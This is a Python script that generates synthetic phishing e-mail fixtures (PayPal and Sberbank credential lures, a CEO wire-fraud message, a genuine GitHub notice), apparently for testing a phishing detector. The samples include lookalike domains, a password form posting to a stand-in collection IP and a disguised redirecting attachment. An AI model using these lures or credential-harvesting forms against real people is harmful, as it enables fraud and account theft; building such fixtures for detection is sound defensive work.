"""Build synthetic .eml samples used in the README and tests.

All domains, people and companies are fictional or reserved for documentation
(example.com, RFC 5737 IPs). Do not use these samples to send real e-mail.
"""

from __future__ import annotations

from email.message import EmailMessage
from pathlib import Path

OUT = Path(__file__).parent


def save(name: str, msg: EmailMessage) -> None:
    (OUT / name).write_bytes(bytes(msg))
    print("wrote", name)


# 1. Credential phishing impersonating PayPal ----------------------------------
m = EmailMessage()
m["Return-Path"] = "<bounce@mailer-cloud.example>"
m["Received"] = "from mailer-cloud.example (unknown [203.0.113.45]) by mx.example.com"
m["Authentication-Results"] = "mx.example.com; spf=softfail smtp.mailfrom=mailer-cloud.example; dkim=none; dmarc=fail header.from=paypa1-secure.com"
m["From"] = "PayPal Security <service@paypa1-secure.com>"
m["Reply-To"] = "support@helpdesk-mail.example"
m["To"] = "alex@example.com"
m["Subject"] = "Your account has been limited - action required"
m.set_content(
    "Dear customer,\n\nWe detected unusual activity. Your account has been suspended.\n"
    "Please verify your account within 24 hours or it will be permanently locked.\n\n"
    "Sign in: http://paypa1-secure.com/login/verify?id=88213\n\nPayPal Security Team\n"
)
m.add_alternative(
    """<html><body>
<p>Dear customer,</p>
<p>We detected unusual activity. Your account has been <b>suspended</b>.
Please <b>verify your account</b> within 24 hours or it will be permanently locked.</p>
<p><a href="http://paypa1-secure.com/login/verify?id=88213">https://www.paypal.com/signin</a></p>
<form action="http://203.0.113.45/collect.php"><input name="password" type="password"></form>
<p>PayPal Security Team</p></body></html>""",
    subtype="html",
)
m.add_attachment(b"<html><script>location='http://203.0.113.45/'</script></html>",
                 maintype="text", subtype="html", filename="Account_Statement.pdf.html")
save("phish-paypal.eml", m)

# 2. Russian-language bank phishing --------------------------------------------
m = EmailMessage()
m["Authentication-Results"] = "mx.example.ru; spf=fail smtp.mailfrom=sberbank-bonus.ru; dkim=none; dmarc=fail"
m["From"] = "Сбербанк Онлайн <info@sberbank-bonus.ru>"
m["To"] = "client@example.ru"
m["Subject"] = "Срочно: ваша карта заблокирована"
m.set_content(
    "Уважаемый клиент!\n\nПо вашей карте зафиксирована подозрительная операция, карта заблокирована.\n"
    "Срочно подтвердите личность в течение 2 часов, иначе средства будут списаны.\n"
    "Перейдите по ссылке: https://clck.ru/3AbCdE и введите данные карты и код из SMS.\n\n"
    "Резервная ссылка: http://198.51.100.17/sber/login\n\nСлужба безопасности Сбербанка\n"
)
save("phish-bank-ru.eml", m)

# 3. Business e-mail compromise (CEO fraud) ------------------------------------
m = EmailMessage()
m["Authentication-Results"] = "mx.example.com; spf=pass smtp.mailfrom=freemail.example; dkim=pass; dmarc=none"
m["From"] = '"Ivan Petrov (ivan.petrov@example.com)" <ceo.office.2026@freemail.example>'
m["Reply-To"] = "ceo.office.2026@freemail.example"
m["To"] = "accounting@example.com"
m["Subject"] = "Confidential payment"
m.set_content(
    "Hi,\n\nI'm in a board meeting and can't talk. We need to make an urgent wire transfer to a new supplier "
    "today. I'll send the new bank account details in a minute. Please keep this confidential and "
    "act now — the deal closes within 2 hours.\n\nIvan\nSent from my iPhone\n"
)
save("bec-ceo-fraud.eml", m)

# 4. Legitimate notification -----------------------------------------------------
m = EmailMessage()
m["Return-Path"] = "<noreply@github.com>"
m["Authentication-Results"] = "mx.example.com; spf=pass smtp.mailfrom=github.com; dkim=pass header.d=github.com; dmarc=pass header.from=github.com"
m["From"] = "GitHub <noreply@github.com>"
m["To"] = "alex@example.com"
m["Subject"] = "[GitHub] A new SSH key was added to your account"
m.set_content(
    "Hey Sashagran!\n\nA new public key was added to your account.\n"
    "If you did not add this key, review it here: https://github.com/settings/keys\n\nThanks,\nThe GitHub Team\n"
)
save("legit-github.eml", m)
